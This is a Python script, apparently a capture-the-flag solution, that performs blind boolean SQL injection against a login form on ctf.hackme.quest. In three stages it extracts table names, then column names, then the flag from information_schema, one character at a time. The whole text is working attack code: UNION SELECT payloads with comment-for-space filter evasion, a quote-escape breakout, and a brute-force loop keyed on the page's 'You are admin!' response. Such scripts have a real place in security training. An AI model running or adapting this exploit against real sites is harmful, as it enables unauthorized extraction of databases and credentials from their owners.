import requests
table = ''
query = r"aaa\'/**/union/**/select/**/1,2,3,ascii(substr(group_concat(table_name),{},1))={}/**/from/**/information_schema.tables/**/where/**/table_schema=database()#"

for pos in range(50):
    for char in range(32, 127):
        post = {"name": query.format(pos, char), "password": "123"}
        ret = requests.post("https://ctf.hackme.quest/login1/", post).text

        if "You are admin!" in ret:
            table += chr(char)
            print(chr(char), end='')
            break
print(table)
# 0bdb54c98123f5526ccaed982d2006a9,users

column = ''
query = r'aaa\'/**/union/**/select/**/1,2,3,ascii(substr(group_concat(column_name),{},1))={}/**/from/**/information_schema.columns/**/where/**/table_name="0bdb54c98123f5526ccaed982d2006a9"#'

for pos in range(50):
    for char in range(32, 127):
        post = {"name": query.format(pos, char), "password": "123"}
        ret = requests.post("https://ctf.hackme.quest/login1/", post).text

        if "You are admin!" in ret:
            column += chr(char)
            print(chr(char), end='')
            break
print()
print(column)
#4a391a11cfa831ca740cf8d00782f3a6,id

flag = ''
query = r'aaa\'/**/union/**/select/**/1,2,3,ascii(substr(group_concat(4a391a11cfa831ca740cf8d00782f3a6),{},1))={}/**/from/**/0bdb54c98123f5526ccaed982d2006a9#'

for pos in range(70):
    for char in range(32, 127):
        post = {"name": query.format(pos, char), "password": "123"}
        ret = requests.post("https://ctf.hackme.quest/login1/", post).text

        if "You are admin!" in ret:
            flag += chr(char)
            print(chr(char), end='')
            break
print()
print(flag)